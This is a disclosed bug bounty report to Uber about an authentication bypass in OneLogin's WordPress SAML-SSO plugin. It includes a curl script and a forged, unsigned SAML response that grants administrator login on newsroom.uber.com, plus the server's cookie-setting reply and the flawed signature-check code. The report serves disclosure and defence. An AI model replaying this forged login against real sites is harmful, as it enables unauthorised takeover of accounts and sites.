@@ -1,0 +1,108 @@
+ReportLink:https://hackerone.com/reports/136169
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/jouko
+ReportedTo:Uber(uber)
+BountyAmount:10000.0
+Severity:
+State:Closed
+DateOfDisclosure:06.06.2016 9:54:01
+
+Summary:
+
+First, I'm sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites).
+
+#Overview#
+The *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication.
+
+The attacker can supply a username, email adress, name, and a role. If the username doesn't already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested).
+
+It looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as "administrator", or the email address or username of an existing administrator.
+
+#PoC#
+I tried this on two sites. On eng.uber.com I couldn't guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a "subscriber" level account. On newsroom.uber.com the role name apparently was simply "administrator" so I got that privilege on the system. Some other plugin settings may affect this behavior too.
+
+#Reproducing#
+An example shell script:
+~~~~ sh
+#!/bin/sh
+xml=`base64 response.xml`
+curl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' \
+    --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
+~~~~
+The required file "response.xml" containing a SAML response:
+~~~~ xml
+<samlp:Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="R0bdb6f33ef84425aa2782eab4483792762f297df" Version="2.0" IssueInstant="2016-05-04T01:37:34Z" Destination="" InResponseTo="ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c">
+<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
+<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Version="2.0" ID="pfxb75932c2-2e44-d18d-224b-354849a292af" IssueInstant="2016-05-04T01:37:34Z">
+<saml:Subject>
+<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">jouko@iki.fi</saml:NameID>
+<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+<saml:SubjectConfirmationData NotOnOrAfter="2016-05-04T01:40:34Z" Recipient="" InResponseTo="ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c"/>
+</saml:SubjectConfirmation>
+</saml:Subject>
+<saml:Conditions NotBefore="2016-05-04T01:34:34Z" NotOnOrAfter="2016-05-04T01:40:34Z">
+<saml:AudienceRestriction>
+<saml:Audience>php-saml</saml:Audience>
+</saml:AudienceRestriction>
+</saml:Conditions>
+<saml:AuthnStatement AuthnInstant="2016-05-04T01:37:33Z" SessionNotOnOrAfter="2016-05-05T01:37:34Z" SessionIndex="_b340ffa0-f3c6-0133-3483-02a5406d9a2f">
+<saml:AuthnContext>
+<saml:AuthnContextClassRef>
+urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
+</saml:AuthnContextClassRef>
+</saml:AuthnContext>
+</saml:AuthnStatement>
+<saml:AttributeStatement>
+<saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.Username">
+<saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">admin</saml:AttributeValue>
+</saml:Attribute>
+<saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.LastName">
+<saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">Pynnonen</saml:AttributeValue>
+</saml:Attribute>
+<saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.FirstName">
+<saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">Jouko</saml:AttributeValue>
+</saml:Attribute>
+<saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="User.email">
+<saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">noreply@uber.com</saml:AttributeValue>
+</saml:Attribute>
+<saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="memberOf">
+<saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">Administrator</saml:AttributeValue>
+</saml:Attribute>
+</saml:AttributeStatement>
+</saml:Assertion>
+</samlp:Response>
+
+~~~~
+
+Running the script sends an HTTP request containing a faked SAML response to WordPress. The plugin accepts it, sets authentication cookies and redirects the user to the front page.
+
+Sample WP response:
+~~~~
+HTTP/1.1 302 Found
+Server: nginx
+Date: Wed, 04 May 2016 06:24:22 GMT
+Content-Type: text/html
+Content-Length: 20
+Connection: keep-alive
+Keep-Alive: timeout=20
+Set-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/wp-content/plugins; secure; httponly
+Set-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/; secure; httponly
+Set-Cookie: wordpress_logged_in_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ce566c71dac745da6f17cd52c7c3c2d3f0cc6baec81b4d79d97fb153896e0acee; path=/; secure; httponly
+Set-Cookie: saml_login=1; expires=Thu, 04-May-2017 06:24:22 GMT; path=/
+Set-Cookie: wordpress_user_sw_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/
+Set-Cookie: wordpress_user_sw_secure_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/
+Set-Cookie: wordpress_user_sw_olduser_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/
+Location: https://newsroom.uber.com
+~~~~
+After this you can e.g. copy the cookies to a web browser to use the website as a logged-in user.
+
+#Details#
+The WordPress plugin fails to adequately validate the SAML response. The bug is in the file *wp-content/plugins/onelogin-saml-sso/php/lib/Saml2/Response.php*, function *isValid()*. The cryptographical signature check is inside a code block that is executed only if the XML response contains a <ds:Signature /> tag.
+~~~~ php
+   if (!empty($signedElements)) {
+       // verify signature
+   }
+~~~~
+If the tag is left out, then the plugin accepts any "authentication OK" response without checking if it's coming from a trusted source.
+
+The above XML may have some unnecessary data. I just took a valid OneLogin response and removed the <ds:Signature /> tag, plus some others.
